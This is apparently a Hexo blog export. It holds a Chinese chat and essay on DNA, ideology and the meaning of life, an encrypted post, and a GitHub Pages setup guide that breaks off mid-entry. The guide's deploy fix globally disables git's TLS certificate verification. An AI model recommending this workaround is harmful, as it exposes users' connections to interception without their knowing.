rq:不一定<br>18:48:41 rq:dna未必是自身的<br>18:48:46 rq:也可能是他者的<br>18:48:53 rq:比如我想保护一个小兔子<br>18:49:06 xy:遗传的<br>18:49:12 rq:从水里救一群动物<br>18:49:16 rq:然后牺牲自己<br>18:49:20 rq:都有可能<br>18:49:32 rq:所以有人说dna就像病毒<br>18:49:45 rq:以dna自身传播为目的<br>18:49:58 xy:那这里世界上最早的dna是上帝创造的吗<br>18:49:58 rq:动物本身都是DNA操纵的<br>18:50:09 rq:这个有点难回答<br>18:50:19 rq:上帝这个东西太模糊了<br>18:50:20 xy:有理<br>18:50:29 rq:神性是什么<br>18:50:40 rq:得定义<br>18:50:54 xy:在以亿计的个体中，多样性的dna造就了混沌，形成了发展<br>18:51:07 rq:我的感觉是这样的<br>18:51:17 xy:而发展，又会反作用于dna<br>18:51:32 xy:循环，迭代<br>18:51:42 rq:人在处于生存危机的时候，会产生焦虑<br>18:51:53 rq:嗯嗯<br>18:51:55 xy:但是不知道最终收敛还是发散，如果是收敛，也不知道是收敛于什么<br>18:51:57 rq:感觉是这样<br>18:52:11 rq:感觉不会收敛<br>18:52:27 rq:我们目前最准确的科学表明<br>18:53:03 rq:世界的规律只能决定一个基础<br>18:53:19 rq:这个基础之上要抛骰子<br>18:53:29 rq:才能得到最终结果<br>18:53:55 rq:意义的感觉就好像是<br>18:54:22 rq:我对一个事物，下意识地产生一种解读<br>18:54:46 rq:是这个解读，让人觉得东西有某种意义<br>18:54:58 rq:但是这种解读，也是社会构建的<br>18:55:03 xy:对于个体本身而言的意义吗？<br>18:55:08 rq:对<br>18:55:11 rq:具体的意义<br>18:55:18 rq:有点意识形态的味道<br>18:55:40 xy:dna决定的？<br>18:55:55 xy:就像是发展反作用于dna一样？<br>18:55:58 rq:比如最简单的，看到砖头想到这玩意能盖房子<br>18:56:19 rq:这种是文化构建的意义<br>18:56:28 rq:对<br>18:56:33 xy:我可能想不到能盖房子<br>18:56:51 xy:至少可能不会第一眼就想到<br>18:57:09 xy:可能会根据历史经验唤醒脑海中的一幅有这种砖头的图像<br>18:57:12 rq:主要是下意识的<br>18:57:25 rq:有个体差异是肯定是<br>18:57:50 xy:这种唤醒本质上其实就是联想<br>18:58:49 rq:但是可能要比联想更坚固<br>18:59:08 xy:是，因为是下意识的<br>18:59:18 rq:对<br>19:00:00 rq:怎么活才有意义，或者无论如何都没有意义<br>19:00:00 xy:其实想想，有这种联想，很多东西才可以互动<br>19:00:19 rq:对这些问题的回答，就能看出来一部分意识形态上的差异<br>19:00:28 rq:对<br>19:00:42 xy:看山不是山，本质上是土堆，这就是看啥都没有意义的感觉<br>19:00:51 rq:主客观世界的交流<br>19:01:04 xy:看山还是山，就是指赋予了这个土堆以山的名义<br>19:02:06 xy:从上面聊的 发展 和 dna的关系感觉可以推出，一开始只需要一个导火索<br>19:02:13 xy:就能引发这个爆炸<br>19:02:29 xy:自运行的<br>19:02:50 rq:有这个意思<br>19:02:58 rq:看山是山<br>19:03:12 rq:原是只知道山是个山<br>19:03:38 rq:我得组织一下。。<br>19:03:41 xy:而这个山，就像一开始灌输给人们的潜意识<br>19:03:58 rq:嗯嗯<br>19:04:05 xy:有点像当代ziben主义洗脑的一套<br>19:04:17 rq:但是谁也跳不出意识形态的圈子<br>19:04:18 xy:让人下意识地看山是山<br>19:04:30 rq:无论如何人都活在一个意识形态底下<br>19:04:45 rq:包括文学的功效<br>19:04:49 rq:只有两个<br>19:04:51 xy:无法做到绝对理性吗？<br>19:04:53 rq:构建一种意识形态<br>19:04:57 rq:打破一种意识形态<br>19:05:02 xy:是的<br>19:05:04 rq:绝对理性对人而言不可能<br>19:05:09 rq:因为人要处理的问题<br>19:05:11 rq:不是理性的<br>19:05:25 rq:不都是理性的<br>19:05:29 rq:我算个力学题<br>19:05:34 rq:我肯定可以绝对理性<br>19:06:03 rq:但是我讨论某个人做某件事对不对<br>19:06:11 xy:但是力学体系本身可能就是人类对客观世界的一种极其相似的拟合<br>19:06:14 rq:这个“对不对”的问题<br>19:06:16 rq:就不可能理性<br>19:06:22 rq:是的<br>19:06:32 rq:暂时不考虑理性的正确性<br>19:06:50 rq:我相信科学也是一种意识形态<br>19:06:59 xy:赞同<br>19:07:03 rq:科学也只是一种解释世界的方法<br>19:07:06 rq:但不是唯一的<br>19:07:12 xy:比如神学<br>19:07:28 rq:如果你一切都信科学，可能就是尽信书了<br>19:07:30 rq:嗯<br>19:07:34 xy:是的<br>19:07:38 rq:要接受不同的声音<br>19:07:56 rq:大家的想法都不一样，对某件事的“对错”观念都不一样<br>19:08:23 xy:对，有差异，就会造成螺旋上升<br>19:08:38 rq:是的<br>19:08:41 xy:长期积累可能反作用于dna<br>19:08:51 rq:嗯嗯<br>19:27:42 rq:世界可能是很和谐的，很具有“理性”的，我们可以用理性在一定程度上预测世界的发展。但是一旦落实到人和人之间的问题，理性为什么失效了呢？我觉得，是问题性质上的不同。人想要的东西是意义，是形形色色的“快乐”（不同人的快乐显然不同），这种东西并不是世界的内禀属性，是人附加上的东西。如果宇宙存在什么意义，而人想要帮宇宙实现这一意义，显然又是没有必要的。人本身就在宇宙的支配之下，一举一动都是在实现宇宙的意义。假设人以实现自身的意义为前提，在这一理论下行动的人，已经不是“绝对理性”了，他的意识形态便是“尽可能实现自己的意义”。<br>19:29:54 rq:如果做出让步，允许他带有这种意识形态的话，接着又得是复杂度的问题了。人能否通过预测世界的发展，来做出相应的举动，使得“最大化实现自身的意义”得以实现。<br>19:30:35 rq:或许有人能做到这种程度上的理性<br>19:31:11 rq:但是通过预测来实现自身的意义，更给人一种生活缺失意义的感觉<br>19:31:34 rq:对这个问题的理解有个体差异<br>19:31:49 rq:“绝对理性”能否实现，可能还是定义的问题<br>19:33:33 rq:从某种意义上说，如果“绝对理性”是为了达到宇宙的意义，那么只要什么都不要管就好。<br>19:33:42 rq:这样也可以称作绝对理性<br>19:36:01 xy:刚看到消息，我看看想想啊<br>19:50:11 xy:[图片]1、但是我感觉这种和谐可能不稳定（短期来说），预测是基于稳定的，比如蝴蝶效应，比如黑天鹅，长期来说，感觉历史数据有限，而且很多的不稳定因素都可能导致产生很多种可能的世界，就像平行宇宙那样<br>2、形形色色的快乐，只要能诱发多巴胺的事物，似乎都能产生快乐，不同的人由于个人成长环境不同（就像是历史投递数据不同）导致产生多巴胺的函数不同，这个函数假如就是由dna和深圳时的历史数据喂成的<br>3、这种东西不是世界的内禀属性，是人附加上的，  这里附加意义的人，是自己附加上去的，还是别人附加上的然后灌输给本人的意义？感觉大多数人属于后者，比如学校，父母，都是传授历史数据的人，<br>4、不知道宇宙存在什么意义，你觉得宇宙存在的意义是啥？赞同“一举一动都是在实现宇宙意义”这个观点<br>5、赞同这句话，“在这一理论下行动的人，已经不是绝对理性了”这就像看山还是山这个一样，主管赋予了客观一种意义，这本身就是主观的，基于此的行为不是绝对理性。所以最后一句话“尽可能实现自己的意义”就像是“人生就是一场自定义的游戏，胜利去状态是自己定义的，游戏的玩法也是自己选的”。细思极恐，这样的话可以推出：我们可能活在自己选定的游戏，一个虚拟游戏之中，也许就像黑客帝国那样<br>19:50:38 xy:细思极恐<br>19:52:12 xy:你看过西部世界第三季吗？好像是第三季，就是到现代的那一季，里面预测了每个人具体的死亡时间，根据历史数据<br>19:53:54 xy:就像，玩游戏其实也是一种无聊，但是与游戏中的人互动，互动性越强，随机性越高，这个游戏越逼真，这个思路想下去，真实世界，就像是 一场随机性最高的游戏，最逼真<br>19:54:59 xy:这个就像 无为而治 佛教的放下 随他去的意思<br>19:54:59 rq:一个人如果只为了多巴胺，那又是享乐主义的极端了。<br>文学具有互文性和自反性，我相信人的意识形态也是这样的，我们既在吸收别人构建的意识形态，也在反抗这种构建。所谓的进步就是如此。<br>19:55:37 xy:只为多巴胺，享乐主义就像是太沉溺于显示世界这个游戏了<br>19:56:20 rq:享乐主义只是一种沉迷的方式<br>19:56:34 rq:只要把自己的“主义”贯彻到底<br>19:56:42 rq:都是沉迷<br>19:56:43 xy:都算沉迷<br>19:56:47 rq:包括颓废主义<br>19:56:57 rq:你不顾现实<br>19:57:03 rq:也是在遵从现实<br>19:57:14 rq:所以我们跳不出去这个圈子<br>19:57:30 xy:这就是现实世界的玩法<br>19:57:54 xy:有一个方法可能可以跳出这个圈子<br>19:58:16 xy:我感觉，我们在聊非常极端危险的话题<br>19:58:24 rq:就算不玩了，也是在这个圈子里<br>19:59:26 rq:既然大家都知道世界上四维的，你怎么玩的游戏，本质上就是你刻在四维空间的一个世界线<br>19:59:46 rq:这个世界线长成啥样<br>20:00:20 rq:你对现实的“沉迷”方法就确定了<br>20:01:00 rq:当然，这个也是我在迷信科学的大前提下得到的结论<br>20:01:14 xy:就像是一只蚂蚁，当用手挡住了它的去路，它也许只能用触角去试探，然后向左，向右，或者爬过<br>20:01:18 rq:我们总得凭感觉去相信一点东西，才能讨论别的东西<br>20:02:20 xy:那是什么决定这个世界线长成什么样的呢？<br>20:02:46 rq:最本质地说，应该是宇宙的规律吧<br>20:03:02 xy:但是似乎谁都不知道宇宙的规律<br>20:03:14 rq:所以无从谈起<br>20:03:21 rq:包括相信宇宙有规律<br>20:03:24 xy:哈哈哈哈<br>20:03:26 rq:相信理性<br>20:03:32 rq:所有都是我相信<br>20:03:38 rq:我希望它是对的<br>20:03:48 rq:说到底都是我的一种恳求<br>20:04:07 xy:你对经济学有了解吧？<br>20:04:14 xy:经济学挺有意思的<br>20:04:16 rq:了解的不多<br>20:04:47 rq:经济学应该涉及的东西挺广泛的<br>20:04:50 xy:就像是关于人类社会的说明书一样，但是没有那么明确<br>20:05:02 xy:但是可以解释大部分<br>20:05:20 xy:比如，利益就像动力来源<br>20:05:36 rq:可是这只是一种意识形态<br>20:05:42 rq:只能说大部分人确实如此<br>20:05:43 xy:对<br>20:06:01 rq:我宁愿相信经济学是说统计意义上的人<br>20:06:11 xy:是一种对人类社会拟合的比较好的意识形态<br>20:06:21 rq:人平均下来是什么样子的<br>20:06:36 xy:对个体没有意义，个体的意义取决于他想怎么玩这个游戏<br>20:07:19 rq:对人类取平均<br>20:07:22 xy:可能是大家共识的样子<br>20:07:29 xy:就像平均脸<br>20:07:40 xy:这跟脑科学有关了<br>20:07:57 rq:脑科学到心理学，应该也是复杂度的问题<br>20:08:16 xy:有个观点认为，平均脸就是最帅和最美的<br>20:08:36 xy:因为共识度高，而共识度高就对应平均数<br>20:08:40 rq:这个美，是指看得顺眼<br>20:08:53 xy:是的，由大脑决定<br>20:08:54 rq:对的</p></blockquote><h2 id="自我思考"><a href="#自我思考" class="headerlink" title="自我思考"></a>自我思考</h2><p>人生三境界：</p><blockquote><p>一重境界：看山就是山</p><p>二重境界：看山不是山</p><p>三重境界：看山还是山</p></blockquote><p>第一重，人们沉溺于灯红酒绿，容易被带节奏，活了大半辈子可能还没活明白自己图啥；</p><p>第二重，如鲁迅所言，黑屋中看得见的人比看不见的人更痛苦，就像《love，death&amp;robot season2》中的齐马蓝，苦寻生命的意义何在，其中不乏选择结束自己的生命；</p><p>第三重，他们懂得此山非彼山，山的本质是土堆，但这些人智慧于会自己赋予这些土堆意义，即看山还是山。人生亦是如此，多巴胺的意义同样需要被赋予，这便是活着的意义。</p><p>生命本无意义，只是一场非常逼真的游戏，无论是积极进取，还是碌碌无为；无论是加油内卷，还是选择躺平；都跳不出这个游戏，唯有死亡，似乎才能结束游戏，但是，谁又知道所谓的死亡是不是另一个开局呢？似乎从无考证。所以，我得到的结论就是，好好活着，选择自己喜欢的方式活着，玩好这局，也算是不枉此生的意义。</p><p>也许上帝在寻找这个世界的终极命题，我们就像是遗传算法中的牺牲者，一代又一代，存活在短暂的内存世界，享受片刻的欢愉。</p><hr><p>2021.6.6更新</p><p>想明白终极意义之后，人生的很多问题就变得容易解决多了。</p><p>开挂方法，就是把不喜欢的，变为喜欢的。</p><p>从没有固定的方法论。</p>]]></content>
      
      
      <categories>
          
          <category> 7R3S </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 灵感 </tag>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高校毕业生自我鉴定</title>
      <link href="2023/03/30/7Rationality3Sensibility/Rationality/%E9%AB%98%E6%A0%A1%E6%AF%95%E4%B8%9A%E7%94%9F%E8%87%AA%E6%88%91%E9%89%B4%E5%AE%9A/"/>
      <url>2023/03/30/7Rationality3Sensibility/Rationality/%E9%AB%98%E6%A0%A1%E6%AF%95%E4%B8%9A%E7%94%9F%E8%87%AA%E6%88%91%E9%89%B4%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4ffb5042feb8b22a297e204ce1aaaf616177b610a8d4f2de7c8abca76eb27d1d">c05db5c9326e1a204d18d71a654b071fc2e785501ab97994cc5c546af9cba81d0ce7c257fe28370af37af83427c0af760a47135c9018b3751c9c7c32eaf37eeefc49a52d0831926feb416d8c2efdb96500edb754d5c084932e796d0ce8ad0a6903a81c173f3b255faa6829ac2dc0a65abc5ca534194eb434dc303938592a864e5b19eac8667e6cacdcc60dcb03db78ddbc69716cf5c6bb5853d185309d682f35f28492d1ce40ad6e0ae74f9ff358a4eff09da2c7ced7e69a55f62152b04bd3c2436102301749782b5f792215c08b9ae36cfa1e60729bc6d0fa4d514ef3fd3ec9a21ddf80704ddc149772fe691979aa29ab9da405a969aa5cbc46f0bbb680613efb4b2244d6f84d4b391191a9fa9d2935c6f07f54bfa418237341ba6b3bbd6eef46c792b7c3e5ba3cba6ca3faa0653911deca50ec200045b827dc89f5182b1d9e2c05a4ca0af1f703dd197cc35f4e63350955c0a51c59a1b63313e034968e28ab837dfaf39647b6587b1ecb8a23eac701909554ffa265c1d07d621db444f10ccea16fe383414225677f2bbda9616534ad83bd7922dd3d71ea339025fc88b706883acf39fa0c942a838af0dc70e34cc4890939138e139d2d459512a21ada0f5652c7bbe40a578f8584d4322ca7b19a2d169c010aeb502548319046ea92f30649615b72c42d60f93d2bf5fc1c30bcc93124c08359009f762aa72c65024e04e2821eafd18d40fe570f0c0210127439d87c676c5ebf1c220f75355ea426b7f98aa5cfe3610d39ed3a83e9d6ff5d0343280109852cb5b2ef54979fced0d993877c262af32589d9af1151cdc1d2c8cb05585e785cc9815931ebe1167fe91e977896f936cc2070e9de7be4d123158ed13d96c234c22acf554e58ddd764bb4c3f5954e5f9ef85512f74e737a15714d571c0fc10764c45d24ef7c4a5a25dcbaf3e51a44495140177d4d1968296788315879ee80722770bb048dd87d49481766d2de8a5279af701203ca3ea7980a51afd824e59e2787b0d87484d72b5a3f3b453f0e00f43fdb7c4789a3423029d8dbe6506b15cd7371550c7fcfb382c09f7ddc080ecd3ab2e503a3153e325e15e9f30fe627e896d15305e173956a43c25e2f4c01b33f255d78c49280b38d7265d605f29a945caec1134260d908b957ee0eac302e667cd608080d47f11fdcc2ff61090ae79b455730786f94f24e3a733ce6094940271d0d62d474d2a0c84bd4b2389f2494e2381fcbe526777c979b7767f002d2091c559a444acdf73d537dd93320961f4a471025d9c544283911a3c8bec365cf190c2839f422444d4cab9bee3e6bb8528fd3c070ff03d318ab3f0b3e1df89698cccfb31754a056bb50ed8855f12c5f9bbbe69c76c7107c0bd717cf345c9af9cb4756d466cbb3ad839fa42d9f41b5d150a5b391be6943ebbad4f915d103e4f8716ee17f18a979f454d1a2e2b1de318e402e1e4716a99b9da28684142a2737695868431ab45924b80793eb12a747536fcd6ec6b5fd0f70924d637e5d0a2f3576ff96f1721f7757620ef97bb37e5949a23f35fcca302eaa8ed79dc04de626e516cbff7d585c1c92d298b0c48e1acdd5bfd4c9280cd66f4823a2ff18f15964b8202807c3797748e35a4ec5168612838923a5e85dcfa6fda3f5bdf480f073629686e9dd86e4ee6fc0274af5a34fe68f042495de556658612c6ae6eeaf9b75bf33d2b758ccbe648bb093bb83d7e2053e62bfbf1df2b1b066780778605cdd919c66f8aa10abad5c641913facf1a06cb9e7aceeb74829203f4636be6e6b4d6857fb693e15f5add461cff6c4f84c8b5623484fe47257a049f432c161c054bca9185cd2d580b9a3e7fc4f3242471eb9d13b89ca4399f5b058ec2a4530a30c9695685c47d970a5132db212848878c208a378ae37016630504944191028aeb59be56cdf30fecf1707f0db4f040d35b2969adc698f70fa1827d362e1d4942f0d2cc4aae391957687184c85fe122a932998d1220fd03db5c82ec97dd2f1b367b7f8d737a35ed2ab5696c62bea442c77571175770c3a649a9147b12ca4afac28df68f570be7d84b6ee1ec7deda6aebd968f8dba75c95c9f05c6b7db6a58f70400a3f31854fad9757996aab7b4006dd7d47b34901d0b172242382c927e215e185a4eb6b9b4b17351cd78c47cdde0bfb4cc3e7a11dd26d6edab1cf1da4a0ea7757d3c14cd8935255c697671d624cebf44b768bf567b47e983f1f8d552c5ce1738d87aaf3afe991aaae50bb0e2822c72c644be45ef0b1a99495b31046a8050ad8e82508e8ebcb877867da2479ae1a6107986879339d990693dd9283d0e765e5cac852c06547b408870781013b7d06b0196a51c7aef5030440dde332bb1a04f03729ba2c7c4e8c1dc00274fb896205cfe545109519a8ad86aae450227113c52f4b21235b21d7f007358e92f58247d660f8455124e79b0647a6a6a9e3f1d301a3f1b456768db05576031ca8b5a68a0594d9ad8c9984c821c71790a1af9fae61787760db4c0ff8766df11a339e7df8d2013268153aab324f2877170b76ab9622e7745914d6b0264a9ff7a735dc93ab9d12c60b9ccfc4c1e841b13046b0cbb44e8a0f9b552cd5ee6652147ab13e71b7f4cfa886b999b11450aed647d8bbd045a829799dde04e5d0ee31a6042f7b37fd2f9cd8d389bed51a36d6a01fc8830d90bf4122c70a244d9cd4bb241716532ece6d55bea11098ae291d610efcfc3b5308a5a7b30645901b339846f3465cfe77bbc7f32c5ff68502720953a63d18e1e289ab12c2b860ef43a657fe4a5ad3119719915e72051c379342d887cf87bb05357da99893112c3500e100a7d1cdc3453e161d7cbc422fff0b00715e78d7c5f3162ec291660d86250a1d81143b1baf4c224210835a6800ea52c7083bc797d34556da4b706fef2f2c981fcd4c9f65c00617190fc7429e2fef4162124d39ed6b0070853bfbc1386951fb2a5f133f7a230755154ac2f023b6baa2a688d982590e8fd8e00f6074b27a56991eab191a9ad9158bacaf51d964fa1ac339de61daf31e11844bcb50d812e66999d4e11b4cff6013bad93012a91cf19ac0186377e9252fca3f39c31db5d07b6014aab51daaef82d0376c98029f1db0182e18007b7cf90246d30940fa72bb507fc6d0031e3f1ad33e85992e2b488620e34cc0ab8d03619acf726e3071a4ec4d2626b974af3c47158ba4dbe215370f1d850f0d05aa2dc56e36fbdf78961f71adf7e23e08a5ff9c010c9f831bb8636a85ae1680623ea91814aacfab6da449c816245f5865904ba8c7f4ab1da247bbd873bf27179ddb8caf0400350d8661be2c879fa9cb57782e75da31f4b9b5e7e4561a4dac194bec719b93fb630064b340641898edef1a2a8c73fdc48f1ca7a402a779d0e500880403ef46b6c83f5d072768025833abe5cca680dd33fa0e18fdd4d25433da4a6bc2ef630a8cff1c7a690e847019cdac5af0cb064b90be043b47f330f3c9733a64050c21d5925cd9b5268ad9acbe1badc2f9e5ccb8fcb14b12a791306f4cbba7e1be6a2e45b7565e3b6b27ac0d4c7aa2c0c189d7eae82507b17a47dab40752788dc6b109a307902be5abf72e7a7fa075dee252881a1d9ea8ff46963c92afe47da6024064e7b22e05fbb19a61d8afed994cf97870434fb98871db9c56c888bd68d44e72b027d5a7715775f9cd4fcb9de160555b9548ab21a9fc528f864a941f8527e7cc32371feca5c7b36409882530f158927ad83e0ed33443b84a5ff72e919335de016d7a3f3447c2ec543e1738cd6b7c3e215ef2dc7d4309fc6af411338c2e4f244a6e70a6860a775fb48c981cefcb15b1e8bff8737be6abdb8354d702cd7f2373fde06ebf96c32d66b0439966d9edc2798733ddb4ce1d14a85e3e1de1dc6d5dd75a64d4438323f64887f907ee3db18145af884c57198c8339a82db7d74c89614cd1a898966ce7594a639a350721655335e75c18bbf863affed1fc868c7a8ac67d7ef36b12530424ce1b383c3ab6ef34c01d22a62893b9e25ab78aa4932b87c148f84773057ff26bf3bbcd6ad81398dfd9f49d5fbfe71c45cb159ef01ab8dde1bfec055f0329690397df4e587b5af1c433b65b9ab071d72181537356d72216780aa3e8e5c953740530d368b9719d30e26a3d4b440d2c32519cbe4d284e39636bfe3045fc322a4590b4fb72d23f475fa90722f92b8274c1c2ae35b3f43d0f7c433399e15dda977cdd15822c89e1bfe58228d9d13ccd9b265bbab1e9ca3e0e05268189b698e5c084474bdd9afa41b6d7f9f829e6ace8e063a8564589a620d68b190aa6f688aed7b90652d75492e68e3d92a52f56e150c1c8738dbff027260a189ab8e64a4805cdd67b1f3d21bc789c5ccf831bfb6f78e3d218fc55beacb225fcc1f46db5e9acb6f9e81f599808de33a6c0030e35ba102de625dafb1222b2507cfede66287c9602df44216cf2e84183663658f65ccf462067488194a06795ce4fa5252e15f2f61daf1a979f2c03cbb195b818fc93a2296360b4d1919558d09b49a1938b6f2562dfc46368f7e2ddd88b2ad3a97642ddae76da33b94f695fb2d6b432f193188f8b5cd2d31e3d8734fbef8d259da9b0bd875cd42432b9e8bac870481c2b303b72c404656d90edc3b3c41ff063cc1c401468d8816a9510a1c146f5d1c71fc592935f6ac102dfebe1ba5ca25f15d456c205cf2b433bb3d04d21ca5b9e47b46d949d18cd1dfb1add7fb2f59e2a4d1785b45664d58ed00a25bbd18d96e8b70603d649b84420345d4c07f637194cf482e9a058b828055ee947f73d186d28c50e5a4911f338cf8c8dc81b070bfd466cd8e25bd566ff9e3b58e9ea03039c907afa31e4c3a4f0446900ecd7d084f63bd4132b475d2bd571e95b5b0946c5d1eb9024f668feb9fb343a4db8a8bd859be13fe8c867819f996f340e557df056b656940ab8cf07de11ab83fdfc43b8f473cd3fe2676bc17ac62bb1869f481c88a676830f855a01d596c437efd4b8fb99e86e32a59afea3556be6b859cadd1fa18a2ed446e92594d69eb0008a4e1cf72ac24b29c65155bff1156be22bad0671a37ddb938c6d9867c8da86de23dd0d69926d1d3deadf51e000fc294948785c5a837edb56c95476c20a89d81738b64830baa85a69ee4d817ecde90d003227bae56c2a0d26f8b70e0b3d77561361dbf7576beeca60efa8de82aa0c69885381ff86b8a28903693098fc568d4c8e1b393a8ba86dc2f5c74550fd35d570d0ea37033a9c7097b1aba30c48d6cf58850597a147ea45cf3f224de9bda872f64ac17d04f58daba8ee4ba11901c21598b8a3ab85bc70ccc4d49a5a5c0aba99252d6725098c2c685c317fcb8fd3bde0ef0ffd32f3a6e86427a55c0abced87c73c79b4bdbae2bdd3cb16af030ca0f2bd90fb81705023c0762b1a2f72e65fe8a5bb6e26a3efabd4c667c1f51ce66eea7982f61dbf5e3ba5d2957042de2ecf5596c2d287dc2241a94c98075d7bc44e0529259ae46f1c658ce63fb4900c5a559a83ac5118db74ea009c0a6bbbcbb39b60d64a75722d4b7d1a294f7dd1eb08f43c90672586cf9956b22b8202df8899cf3a9873e2bd12e82c8093e03ff9df4c8391751dd407c96a19d8dcb714dcf576bf11efb3e0bb144e6d08c74e78bd7438534e523ab4310ba1203a5b0a2df7e9168a2586c5c9983df70bb264890962a0471a20030dd487f4d4c72853be58ef381cbcecbb91c836ba70591007a1da90624eef8780f590e8bdfc6f02297a8f5af80494cbbbda88851a6687b6677b01586f4afed7a2c91aedc8201566043cb558f207a351f3d9d6518a6a9fb7ac9eeb60be0c2967f1699b1fb1828e23947f4d6cb7f65f6c26e597be33e88fab91a45c8a64b086afc9f99454cb4ff9525a2f6346a94f28658a4d0fca1f46217b68ab4fc8b4af55f4e6db887919a814f246edb133a6ed767dacb9cf0f73406cf86ba92346b7260e65bcb7e088b3b6cd8f450ab7610401f60830ae6e7f0e62f81df047f3f0e59eef1df3498704ec4b2ffd7632d67a6de5c800dcfa4d41ee46b28847e9ee89ba29773a0bde773b473dec5715349e6f5c0e5824293eb4a47289a234bb94e40b577f8d1c24407cbedd8d139b78977c3f360200282321901e59bc80764b9514bfdf4a7b4fd27d1f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 7R3S </category>
          
          <category> Rationality </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Hexo框架搭建博客</title>
      <link href="2021/06/01/%E6%8A%98%E8%85%BE%E5%90%A7/%E5%9F%BA%E4%BA%8EHexo%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>2021/06/01/%E6%8A%98%E8%85%BE%E5%90%A7/%E5%9F%BA%E4%BA%8EHexo%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>以下笔记源自博客文件夹下的readme文件，更新速度比它慢，但是条理性稍微更清晰，此处仅供参考。</p><p>这篇文章展示了巨人肩膀的重要性，我只是踩在一个又一个巨人的肩膀上罢了。</p><h3 id="代码托管与hexo框架"><a href="#代码托管与hexo框架" class="headerlink" title="代码托管与hexo框架"></a>代码托管与hexo框架</h3><p>基于hexo的静态博客搭建教程，涉及git，nodejs，代码托管方可选用github或coding，热铁盒等</p><blockquote><p>参考链接: <a href="https://editor.csdn.net/md/?articleId=116211365">https://editor.csdn.net/md/?articleId=116211365</a></p></blockquote><h3 id="用nvm管理nodejs"><a href="#用nvm管理nodejs" class="headerlink" title="用nvm管理nodejs"></a>用nvm管理nodejs</h3><p>hexo框架基于nodejs，nodejs版本不同会引发一些问题，对于nodejs版本的控制，切换等问题，可以使用nvm</p><blockquote><p> nvm:nodejs版本控制工具<a href="https://github.com/coreybutler/nvm-windows/releases">https://github.com/coreybutler/nvm-windows/releases</a><br>教程:<a href="https://www.cnblogs.com/czql/articles/11064849.html">https://www.cnblogs.com/czql/articles/11064849.html</a></p><p>nvm使用命令<a href="https://www.cnblogs.com/gaozejie/p/10689742.html">https://www.cnblogs.com/gaozejie/p/10689742.html</a></p></blockquote><h3 id="pug和stylus渲染器如果缺失"><a href="#pug和stylus渲染器如果缺失" class="headerlink" title="pug和stylus渲染器如果缺失"></a>pug和stylus渲染器如果缺失</h3><blockquote><p>安装主题时遇到相关报错，安装教程参考<a href="https://blog.csdn.net/qq_38157825/article/details/108401691">https://blog.csdn.net/qq_38157825/article/details/108401691</a></p></blockquote><h3 id="生成ssh密钥便于本地git管理"><a href="#生成ssh密钥便于本地git管理" class="headerlink" title="生成ssh密钥便于本地git管理"></a>生成ssh密钥便于本地git管理</h3><blockquote><p>git配置，以github为静态网页托管平台，bash中配置 git config -global user.name “Liloker”<br>git config -global user.email “<a href="mailto:&#x31;&#56;&#51;&#x78;&#120;&#x78;&#x78;&#x78;&#x78;&#120;&#x78;&#x40;&#49;&#54;&#51;&#x2e;&#99;&#111;&#x6d;">&#x31;&#56;&#51;&#x78;&#120;&#x78;&#x78;&#x78;&#x78;&#120;&#x78;&#x40;&#49;&#54;&#51;&#x2e;&#99;&#111;&#x6d;</a>“</p></blockquote><pre><code>&gt; ssh，简单来讲，就是一个秘钥，其中，id_rsa是你这台电脑的私人秘钥，不能给别人看的，id_rsa.pub是公共秘钥，可以随便给别人看。把这个公钥放在GitHub上，这样当你链接GitHub自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到GitHub上。密钥地址use/liloker/.ssh</code></pre><blockquote><p>github ip 192.30.252.154</p></blockquote><h3 id="域名申请"><a href="#域名申请" class="headerlink" title="域名申请"></a>域名申请</h3><p>1、namecheap中 解析到github</p><blockquote><p>A record @  192.30.252.154</p><p>A record  www 192.30.252.154</p><p>CNAME @ Liloker.github.io.</p><p>CNAME www Liloker.github.io.</p></blockquote><p>2、电脑blog目录下添加CNAME，内容为域名，每次一起推送到github.io中</p><p>3、github项目的page设置页面，修改域名即可，会自动生成CNAME文件，之后每次更新博客需要自己push CNAME</p><h3 id="添加SSL证书"><a href="#添加SSL证书" class="headerlink" title="添加SSL证书"></a>添加SSL证书</h3><p>自2018年起，github的项目setting——page下面提供https，enforce https 打钩即可 ，有时候要等24小时后证书颁发之后才可以打钩</p><p>通过github搭建的Hexo博客如何添加免费的SSL证书？ - Kieran的回答 - 知乎 <a href="https://www.zhihu.com/question/56575838/answer/391419389">https://www.zhihu.com/question/56575838/answer/391419389</a></p><h3 id="hexo-deploy报错"><a href="#hexo-deploy报错" class="headerlink" title="hexo deploy报错"></a>hexo deploy报错</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.postBuffer 524288000 </span><br><span class="line">git config --global http.postBuffer 1048576000</span><br><span class="line">git config --global http.sslVerify <span class="string">&quot;false&quot;</span></span><br><span class="line"></span><br><span class="line">hexo -d</span><br><span class="line">报错fatal: unable to access <span class="string">&#x27;https://github.com/Liloker/Liloker.github.io.git/&#x27;</span>: OpenSSL SSL_read: Connection was aborted, errno 10053</span><br><span class="line">FATAL &#123;</span><br><span class="line">  err: Error: Spawn 